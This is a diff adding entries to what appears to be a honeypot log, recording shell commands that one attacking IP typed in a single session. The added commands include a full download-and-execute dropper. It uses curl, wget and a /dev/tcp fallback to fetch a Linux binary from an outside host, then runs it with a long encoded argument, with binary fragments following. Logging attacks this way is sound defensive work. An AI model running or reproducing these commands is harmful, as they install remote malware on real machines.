@@ -1533,6 +1533,38 @@
             "session": "d9f03ecb0321"
         }
     ],
+    "195.19.105.60": [
+        {
+            "timestamp": "2023-11-07T21:47:07.582872Z",
+            "event": "command_input",
+            "input": "echo 1 && cat /bin/echo",
+            "session": "27a1c2ee6ab0"
+        },
+        {
+            "timestamp": "2023-11-07T21:47:13.857884Z",
+            "event": "command_input",
+            "input": "nohup $SHELL -c \"curl http://18.183.15.88:60103/linux -o /tmp/OnkQSj4Vwd; if [ ! -f /tmp/OnkQSj4Vwd ]; then wget http://18.183.15.88:60103/linux -O /tmp/OnkQSj4Vwd; fi; if [ ! -f /tmp/OnkQSj4Vwd ]; then exec 6<>/dev/tcp/18.183.15.88/60103 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/OnkQSj4Vwd && chmod +x /tmp/OnkQSj4Vwd && /tmp/OnkQSj4Vwd InpydmtVthnebcxYUzBRTMts3Qa9TWtgaWtXXHR2bXRVvA3abMxGUSBTRs5y3ga9Q2xoaWhdXmBxaGtZshfdZchYUzlMR81pwgG0V2xodmhdT2t3aXRetxneaM9YVjhYQM1t3A+kXGppaWhfXnR/anRctA3abMxFUiBTRsty2QSqWmh2fm9VWWp2aWxNsADCbcxCTDFWRdNq2w2yXWtodXpcVnR2aG9DtgbVcsxGWzpURsxv3Be1Q2tpcHRWXHR1bGhXsgfdbsVWUzJSWMhpwgazXXRqdmJVWWp2bG9NsADCbc1PTDFSRdNu2Qe+W2ppc2JPXmh3dm1aqgbZZdNHUDNYQM1t3QOkXGthaWNeQWJydmhfsQ3abMxCWiBTRMly3QWzQ2hsc3ReXmN9bmpctAPMaspYUDBXWMxp2BmxV2xodmlWT25wdmNZqgbacsxFVjpURsxo1Be1VGh2dmxXQWt3aXRftA3abMxGUCBTRMhy2wOqVGl2dWhaVWx3aWpdpAbeaNNEUDBMTsly3gK1V2xodmhbT25wdmNZqgbacsxFVjpURsxo3hewWHRqc2JBXmppamhcvgHcbc1HQjRVWMxs1Rm2X3Rpd2JVWWp2a2xNtQLVcstDTDFWQ9Nq1A2yXWtrdnpeWW1pYGxDvQXCZMRMVDBTRsh83Qa3Q2hsaWxZQW1xYmxdtQPUfMxEVi5QRM9y3QOzQ29vfWxfXml/eGxaqgbbaNNOUi5QRc1m2ge1XGJ4dm9ZQWh0anRctBndZM1MVDBTQsl83QWxQ21haWtfWXR2bGBbtAbfbHUqAty0BQbdo7pCeTKqUA+/5k/qgmjuhEVwGhcM; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/OnkQSj4Vwd && /tmp/OnkQSj4Vwd InpydmtVthnebcxYUzBRTMts3Qa9TWtgaWtXXHR2bXRVvA3abMxGUSBTRs5y3ga9Q2xoaWhdXmBxaGtZshfdZchYUzlMR81pwgG0V2xodmhdT2t3aXRetxneaM9YVjhYQM1t3A+kXGppaWhfXnR/anRctA3abMxFUiBTRsty2QSqWmh2fm9VWWp2aWxNsADCbcxCTDFWRdNq2w2yXWtodXpcVnR2aG9DtgbVcsxGWzpURsxv3Be1Q2tpcHRWXHR1bGhXsgfdbsVWUzJSWMhpwgazXXRqdmJVWWp2bG9NsADCbc1PTDFSRdNu2Qe+W2ppc2JPXmh3dm1aqgbZZdNHUDNYQM1t3QOkXGthaWNeQWJydmhfsQ3abMxCWiBTRMly3QWzQ2hsc3ReXmN9bmpctAPMaspYUDBXWMxp2BmxV2xodmlWT25wdmNZqgbacsxFVjpURsxo1Be1VGh2dmxXQWt3aXRftA3abMxGUCBTRMhy2wOqVGl2dWhaVWx3aWpdpAbeaNNEUDBMTsly3gK1V2xodmhbT25wdmNZqgbacsxFVjpURsxo3hewWHRqc2JBXmppamhcvgHcbc1HQjRVWMxs1Rm2X3Rpd2JVWWp2a2xNtQLVcstDTDFWQ9Nq1A2yXWtrdnpeWW1pYGxDvQXCZMRMVDBTRsh83Qa3Q2hsaWxZQW1xYmxdtQPUfMxEVi5QRM9y3QOzQ29vfWxfXml/eGxaqgbbaNNOUi5QRc1m2ge1XGJ4dm9ZQWh0anRctBndZM1MVDBTQsl83QWxQ21haWtfWXR2bGBbtAbfbHUqAty0BQbdo7pCeTKqUA+/5k/qgmjuhEVwGhcM\" &",
+            "session": "27a1c2ee6ab0"
+        },
+        {
+            "timestamp": "2023-11-07T21:47:13.861106Z",
+            "event": "command_input",
+            "input": "head -c 2386472 > /tmp/H62VTHbUSx",
+            "session": "27a1c2ee6ab0"
+        },
+        {
+            "timestamp": "2023-11-07T21:47:14.119565Z",
+            "event": "command_input",
+            "input": "nohup $SHELL -c \"curl http://18.183.15.88:60103/linux -o /tmp/OnkQSj4Vwd; if [ ! -f /tmp/OnkQSj4Vwd ]; then wget http://18.183.15.88:60103/linux -O /tmp/OnkQSj4Vwd; fi; if [ ! -f /tmp/OnkQSj4Vwd ]; then exec 6<>/dev/tcp/18.183.15.88/60103 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/OnkQSj4Vwd && chmod +x /tmp/OnkQSj4Vwd && /tmp/OnkQSj4Vwd InpydmtVthnebcxYUzBRTMts3Qa9TWtgaWtXXHR2bXRVvA3abMxGUSBTRs5y3ga9Q2xoaWhdXmBxaGtZshfdZchYUzlMR81pwgG0V2xodmhdT2t3aXRetxneaM9YVjhYQM1t3A+kXGppaWhfXnR/anRctA3abMxFUiBTRsty2QSqWmh2fm9VWWp2aWxNsADCbcxCTDFWRdNq2w2yXWtodXpcVnR2aG9DtgbVcsxGWzpURsxv3Be1Q2tpcHRWXHR1bGhXsgfdbsVWUzJSWMhpwgazXXRqdmJVWWp2bG9NsADCbc1PTDFSRdNu2Qe+W2ppc2JPXmh3dm1aqgbZZdNHUDNYQM1t3QOkXGthaWNeQWJydmhfsQ3abMxCWiBTRMly3QWzQ2hsc3ReXmN9bmpctAPMaspYUDBXWMxp2BmxV2xodmlWT25wdmNZqgbacsxFVjpURsxo1Be1VGh2dmxXQWt3aXRftA3abMxGUCBTRMhy2wOqVGl2dWhaVWx3aWpdpAbeaNNEUDBMTsly3gK1V2xodmhbT25wdmNZqgbacsxFVjpURsxo3hewWHRqc2JBXmppamhcvgHcbc1HQjRVWMxs1Rm2X3Rpd2JVWWp2a2xNtQLVcstDTDFWQ9Nq1A2yXWtrdnpeWW1pYGxDvQXCZMRMVDBTRsh83Qa3Q2hsaWxZQW1xYmxdtQPUfMxEVi5QRM9y3QOzQ29vfWxfXml/eGxaqgbbaNNOUi5QRc1m2ge1XGJ4dm9ZQWh0anRctBndZM1MVDBTQsl83QWxQ21haWtfWXR2bGBbtAbfbHUqAty0BQbdo7pCeTKqUA+/5k/qgmjuhEVwGhcM; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/OnkQSj4Vwd && /tmp/OnkQSj4Vwd InpydmtVthnebcxYUzBRTMts3Qa9TWtgaWtXXHR2bXRVvA3abMxGUSBTRs5y3ga9Q2xoaWhdXmBxaGtZshfdZchYUzlMR81pwgG0V2xodmhdT2t3aXRetxneaM9YVjhYQM1t3A+kXGppaWhfXnR/anRctA3abMxFUiBTRsty2QSqWmh2fm9VWWp2aWxNsADCbcxCTDFWRdNq2w2yXWtodXpcVnR2aG9DtgbVcsxGWzpURsxv3Be1Q2tpcHRWXHR1bGhXsgfdbsVWUzJSWMhpwgazXXRqdmJVWWp2bG9NsADCbc1PTDFSRdNu2Qe+W2ppc2JPXmh3dm1aqgbZZdNHUDNYQM1t3QOkXGthaWNeQWJydmhfsQ3abMxCWiBTRMly3QWzQ2hsc3ReXmN9bmpctAPMaspYUDBXWMxp2BmxV2xodmlWT25wdmNZqgbacsxFVjpURsxo1Be1VGh2dmxXQWt3aXRftA3abMxGUCBTRMhy2wOqVGl2dWhaVWx3aWpdpAbeaNNEUDBMTsly3gK1V2xodmhbT25wdmNZqgbacsxFVjpURsxo3hewWHRqc2JBXmppamhcvgHcbc1HQjRVWMxs1Rm2X3Rpd2JVWWp2a2xNtQLVcstDTDFWQ9Nq1A2yXWtrdnpeWW1pYGxDvQXCZMRMVDBTRsh83Qa3Q2hsaWxZQW1xYmxdtQPUfMxEVi5QRM9y3QOzQ29vfWxfXml/eGxaqgbbaNNOUi5QRc1m2ge1XGJ4dm9ZQWh0anRctBndZM1MVDBTQsl83QWxQ21haWtfWXR2bGBbtAbfbHUqAty0BQbdo7pCeTKqUA+/5k/qgmjuhEVwGhcM\" &#UPX!",
+            "session": "27a1c2ee6ab0"
+        },
+        {
+            "timestamp": "2023-11-07T21:47:14.124854Z",
+            "event": "command_input",
+            "input": ">A@/ X'8ELFXLL",
+            "session": "27a1c2ee6ab0"
+        }
+    ],
     "159.65.146.149": [
         {
             "timestamp": "2023-11-06T00:04:20.154859Z",
